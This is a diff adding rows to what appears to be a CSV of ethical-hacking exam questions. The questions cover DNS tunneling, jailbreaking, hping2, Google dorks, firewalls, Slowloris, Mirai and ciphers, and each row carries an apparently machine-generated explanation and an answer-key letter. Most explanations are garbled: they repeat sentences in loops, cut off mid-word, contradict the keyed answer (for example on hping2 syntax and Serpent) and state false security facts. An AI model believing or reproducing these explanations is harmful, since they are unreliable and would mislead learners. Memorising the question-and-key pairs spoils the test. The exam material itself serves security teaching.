+","The best approach would be to use an HTTP proxy server. If you do not know what a proxy is, it is a program that sits between the client and the server, and passes all traffic through it. The proxy can be configured to do all sorts of things, including encryption. In this case, you would configure the proxy to encrypt all outgoing traffic, so that the traffic is routed through the proxy, and then encrypted. This would hide the traffic from the internal IDS. The downside is that it would also hide the traffic from the internal network, so you would need to have some way to get the traffic to the internal network. The other options are not applicable.",C
+140,"John, a professional hacker, decided to use DNS to perform data exfiltration on a target network, in this
+process, he embedded malicious data into the DNS protocol packets that even DNSSEC cannot detect. Using
+this technique. John successfully injected malware to bypass a firewall and maintained communication with
+the victim machine and C&C server. What is the technique employed by John to bypass the firewall?
+A.  DNS cache snooping
+B.  DNSSEC zone walking
+C.  DNS tunneling method
+D.  DNS enumeration
+","This is a very good question. John is using DNS tunneling method, which is a method of tunneling data
+between two hosts. DNS tunneling is used to hide the true destination address of the data. The DNS tunneling
+method uses the DNS query/response protocol and is often used to hide the true destination address of the data.
+In this case, John used DNS tunneling to hide the true destination address of the data, which is the
+target machine. This would be a very secure method of data exfiltration. DNSSEC is used to prevent DNS spoofing.
+B is incorrect because DNSSEC is used to prevent DNS spoofing and not data exfiltration. The zone walking
+method is used to get a list of all the nameservers for a domain and then to send the data to the C&C server.
+C is incorrect because DNS tunneling is used to hide the true destination address of the data. This is
+done by tunneling the data through the",C
+141,"Which iOS jailbreaking technique patches the kernel during the device boot so that it becomes jailbroken after
+each successive reboot?
+A.  Tethered jailbreaking
+B.  Semi-tethered jailbreaking
+C.  Untethered jailbreaking
+D.  Semi-Untethered jailbreaking
+","The tethered jailbreaking technique uses the built-in tethering feature of iOS to jailbreak the device
+when you connect it to a PC. This means that you don’t need to use a USB cable to jailbreak the device.
+Semi-tethered jailbreaking is a technique that requires a tethered jailbreak to jailbreak the device, but
+allows the user to jailbreak the device after the tethering is turned off. Untethered jailbreaking is a technique
+that requires a tethered jailbreak to jailbreak the device, but allows the user to jailbreak the device
+after the tethering is turned off. Semi-Untethered jailbreaking is a technique that requires a tethered jailbreak
+to jailbreak the device, but allows the user to jailbreak the device after the tethering is turned off. Untethered
+jailbreaking is a technique that requires a tethered jailbreak to jailbreak the device, but allows the user to
+j",C
+142,"You want to do an ICMP scan on a remote computer using hping2. What is the proper syntax?
+A.  hping2 host.domain.com
+B.  hping2 --set-ICMP host.domain.com
+C.  hping2 -i host.domain.com
+D.  hping2 -1 host.domain.com
+","The syntax for an ICMP scan using hping2 is hping2 host.domain.com. The syntax for a
+ping is ping host.domain.com. The syntax for a traceroute is traceroute host.domain.com. The syntax
+for an ARP scan is arp host.domain.com. The syntax for a SYN scan is nmap host.domain.com. The syntax
+for a TCP SYN scan is tcpdump host.domain.com. The syntax for a TCP ACK scan is tcpdump host.domain.com.
+The syntax for a TCP FIN scan is tcpdump host.domain.com. The syntax for a TCP RST scan is tcpdump host.domain.com.
+The syntax for a TCP URG scan is tcpdump host.domain.com. The syntax for a TCP ECHO scan is tcpdump host.domain.com.
+The syntax for a TCP ECHO request is tcpdump host.domain.com. The syntax for a TCP PING scan is tcpdump host.domain.com.
+The syntax for a TCP PING request is tcpdump host",D
+143,"You have been authorized to perform a penetration test against a website. You want to use Google dorks to
+footprint the site but only want results that show file extensions. What Google dork operator would you use?
+A.  filetype
+B.  ext
+C.  inurl
+D.  site
+","This is a good question. You can use the inurl operator to search for files within a site. You can also use the filetype
+operator to search for files within a site. The site operator will only return files that have a file extension. The
+ext operator will only return files that have a file extension. The site operator will return all files within a site.
+A, B, and D are incorrect because they are not operators. The filetype operator will return all files within a site
+that have a file extension. The site operator will return all files within a site. The inurl operator will return all files
+within a site that have a URL.
+A is incorrect because the filetype operator will return all files within a site that have a file extension. The site operator
+will only return files within a site that have a file extension.
+C is incorrect because the ext operator will return all files within a site that have a file extension. The site operator
+will only return files",A
+144,"Firewalls are the software or hardware systems that are able to control and monitor the traffic coming in and
+out the target network based on pre-defined set of rules. Which of the following types of firewalls can protect
+against SQL injection attacks?
+A.  Data-driven firewall
+B.  Packet firewall
+C.  Web application firewall
+D.  Stateful firewall
+","The data-driven firewall is not a type of firewall. This type of firewall is used to control access to the network by
+sending packets to a defined set of rules, and it doesn’t filter traffic based on the source IP address or port number. The
+packet firewall is a hardware device that can filter traffic based on the source and destination IP address and port
+number. The Web application firewall is a hardware device that can filter traffic based on the source and destination
+IP address and port number, as well as the application being used. The stateful firewall is a hardware device that can
+filter traffic based on the source and destination IP address and port number, as well as the application being
+used. The stateful firewall is a hardware device that can filter traffic based on the source and destination IP
+address and port number, as well as the application being used. The data-driven firewall is a software application
+that can filter traffic based on the source and destination IP address and port number",C
+145,"Jane is working as a security professional at CyberSol Inc. She was tasked with ensuring the authentication
+and integrity of messages being transmitted in the corporate network. To encrypt the messages, she
+implemented a security model in which every user in the network maintains a ring of public keys. In this
+model, a user needs to encrypt a message using the receiver's public key, and only the receiver can decrypt the
+message using their private key. What is the security model implemented by Jane to secure corporate
+messages?
+A.  Zero trust network
+B.  Transport Layer Security (TLS)
+C.  Secure Socket Layer (SSL)
+D.  Web of trust (WOT)
+","This is a simple one, and it’s easy to get wrong. The Web of trust (WOT) is not a security model. In the
+WOT, users maintain a trust relationship with one another. In other words, you can trust someone to keep your
+data secure, but you can’t trust anyone else. In the case of Jane, the users in the network maintain a trust
+relationship with one another. The keys are used to authenticate and encrypt the messages, but the keys are
+managed by the users themselves. The TLS and SSL are security protocols, but they are not used for
+authentication or encryption. The TLS and SSL protocols are used for the encryption of the messages, but the keys
+are managed by the users. The ring of public keys is a security model, and it’s not a security protocol.
+A is incorrect because the zero trust network is not a security model. A zero trust network is a network model
+that allows anyone on the network to",D
+146,"A DDOS attack is performed at layer 7 to take down web infrastructure. Partial HTTP requests are sent to the
+web infrastructure or applications. Upon receiving a partial request, the target servers opens multiple
+connections and keeps waiting for the requests to complete.
+Which attack is being described here?
+A.  Desynchronization
+B.  Slowloris attack
+C.  Session splicing
+D.  Phlashing
+","This is a partial HTTP request, so it’s not a real attack. The target servers would have to be configured to
+accept partial requests, which is a rare occurrence. The attack is being described here is a slowloris attack, which is
+a denial-of-service attack that uses a partial request to take down a server. The attacker uses multiple connections
+to the target servers, and the target servers keep waiting for the requests to complete. The attacker can then
+continue to send partial requests and wait for them to complete. This is a slowloris attack because the target
+servers are being kept waiting for the requests to complete. The attacker could also be using a phlashing attack.
+A desynchronization attack is a denial-of-service attack in which the attacker sends a partial request to the target
+server and then waits for the response to complete. The attacker can then send a new request to the target server
+and wait for it to complete. The target servers are not being",B
+147,"A post-breach forensic investigation revealed that a known vulnerability in Apache Struts was to blame for the
+Equifax data breach that affected 143 million customers. A fix was available from the software vendor for
+several months prior 10 the Intrusion. This Is likely a failure in which of the following security processes?
+A.  vendor risk management
+B.  Security awareness training
+C.  Secure deployment lifecycle
+D.  Patch management
+","The vulnerability in question was a critical vulnerability that was patched by the software vendor. The vendor
+provided a patch within a few weeks of the breach. The vulnerability was known and public for quite some time
+before the breach. The vendor’s patch was available at the time of the breach. Therefore, the security process
+failure is not the vulnerability. The vendor risk management process would not have prevented the breach in this
+case. The vendor risk management process is the process by which the vendor is aware of a vulnerability and
+has a plan in place to mitigate it.
+A is incorrect because the security awareness training program would not have prevented the breach in this
+case. The security awareness training program is the program that teaches people how to recognize and
+respond to security threats. It is not a security process.
+C is incorrect because the secure deployment lifecycle is a process by which software is tested and validated
+before being released to the public. The vulnerability in question was already known and public at the",D
+148,"Mirai malware targets loT devices. After infiltration, it uses them to propagate and create botnets that then
+used to launch which types of attack?
+A.  MITM attack
+B.  Birthday attack
+C.  DDoS attack
+D.  Password attack
+","C. Mirai is a malware that targets LoT devices and uses them to launch attacks. The malware uses a
+port scanner to search for open ports on the target device, then sends packets to the target device. It
+then uses the target device to send a flood of data to the target system. This is a denial of service attack
+because the target system is not being used for legitimate purposes. The attack is designed to flood the
+target system with so much data that it crashes and/or locks up. The attack is also known as a
+“DDoS attack.” The target system is not being used for legitimate purposes. The target system is
+being used for illegitimate purposes. The target system is not being used for legitimate purposes. The
+target system is being used for illegitimate purposes. The target system is being used for legitimate
+purposes. The target system is being used for legitimate purposes",C
+149,"Thomas, a cloud security professional, is performing security assessment on cloud services to identify any
+loopholes. He detects a vulnerability in a bare-metal cloud server that can enable hackers to implant malicious
+backdoors in its firmware. He also identified that an installed backdoor can persist even if the server is
+reallocated to new clients or businesses that use it as an laaS.
+What is the type of cloud attack that can be performed by exploiting the vulnerability discussed in the above
+scenario?
+A.  Man-in-the-cloud (MITC) attack
+B.  Cloud cryptojacking
+C.  Cloudborne attack
+D.  Metadata spoofing attack
+","#A. In a cloud environment, cloud providers are required to provide the same security controls as those that
+are provided to their on-premises customers. In this case, the cloud provider has implemented a backdoor to
+allow hackers to implant malicious code in the firmware of the server. The backdoor will persist even if the server
+is moved to a new location or is reconfigured as a different service. The backdoor can be installed by a cloud
+provider or by a hacker. It can be used to implant malware in the firmware or in the cloud environment.
+The term man-in-the-cloud (MITC) attack refers to a vulnerability that allows hackers to implant malware in
+firmware. The term cloud cryptojacking refers to a vulnerability that allows hackers to install cryptojacking
+malware in the cloud environment. Metadata spoofing attack refers to a vulnerability that allows hackers to
+install malware in the metadata of a file, which can be used to install malware on the",C
+150,"Tony wants to integrate a 128-bit symmetric block cipher with key sizes of 128,192, or 256 bits into a software
+program, which involves 32 rounds of computational operations that include substitution and permutation
+operations on four 32-bit word blocks using 8-variable S-boxes with 4-bit entry and 4-bit exit. Which of the
+following algorithms includes all the above features and can be integrated by Tony into the software program?
+A.  TEA
+B.  CAST-128
+C.  RC5
+D.  serpent
+","This is a great question. It’s a good one to ask a question about and one that is easy to remember. The answer is easy to
+remember as well. In short, this is a question about a symmetric block cipher. You have a 128-bit key size, and the algorithm
+is using 32 rounds of 128-bit operations. So, the algorithm is the TEA, CAST-128, RC5, and serpent. The TEA is an
+implementation of a 128-bit symmetric block cipher. The CAST-128 algorithm is a 128-bit symmetric block cipher
+that uses 128 rounds of 128-bit operations. RC5 is a 128-bit symmetric block cipher that uses 128 rounds of
+128-bit operations. Serpent is a 128-bit symmetric block cipher that uses 128 rounds of 128-bit operations.
+A and B are incorrect because they are not symmetric block ciphers. C is incorrect because RC2 is a stream cipher and",D
